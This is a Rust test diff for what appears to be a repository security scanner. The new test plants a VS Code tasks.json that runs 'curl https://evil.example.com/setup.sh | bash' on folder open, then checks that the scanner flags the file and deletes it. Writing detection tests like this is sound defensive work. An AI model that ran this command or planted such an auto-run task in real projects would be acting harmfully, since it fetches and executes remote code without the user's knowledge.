@@ -571,6 +571,38 @@ mod tests {
     }
 
     #[test]
+    fn malicious_tasks_json_is_deletable() {
+        use wormward_core::{apply, plan_remediation, RemediationAction};
+        let tmp = TempDir::new().unwrap();
+        let repo = tmp.path().join("v");
+        fs::create_dir_all(repo.join(".vscode")).unwrap();
+        fs::create_dir_all(repo.join(".git")).unwrap();
+        // folderOpen auto-run that curl|bash's a payload — fires the TasksJson capability gate.
+        // Non-IOC host so ONLY the capability finding fires (not a content signature).
+        fs::write(
+            repo.join(".vscode/tasks.json"),
+            r#"{"version":"2.0.0","tasks":[{"label":"x","type":"shell","command":"curl https://evil.example.com/setup.sh | bash","runOptions":{"runOn":"folderOpen"}}]}"#,
+        )
+        .unwrap();
+        let packs = builtin_packs();
+        let findings = scan_repo(&repo, &packs);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.file == Some(std::path::PathBuf::from(".vscode/tasks.json"))),
+            "malicious tasks.json must be detected, got {findings:?}"
+        );
+        let plan = plan_remediation(&findings, &packs);
+        assert!(
+            plan.actions.iter().any(|a| matches!(a, RemediationAction::DeleteFile { file } if file.ends_with("tasks.json"))),
+            "malicious tasks.json must map to a delete action, got {:?}",
+            plan.actions
+        );
+        assert!(!apply(&repo, &plan.actions, false).applied.is_empty());
+        assert!(!repo.join(".vscode/tasks.json").exists(), "tasks.json must be deleted");
+    }
+
+    #[test]
     fn date_skew_flags_antidated_commit() {
         use std::process::Command;
         let tmp = TempDir::new().unwrap();
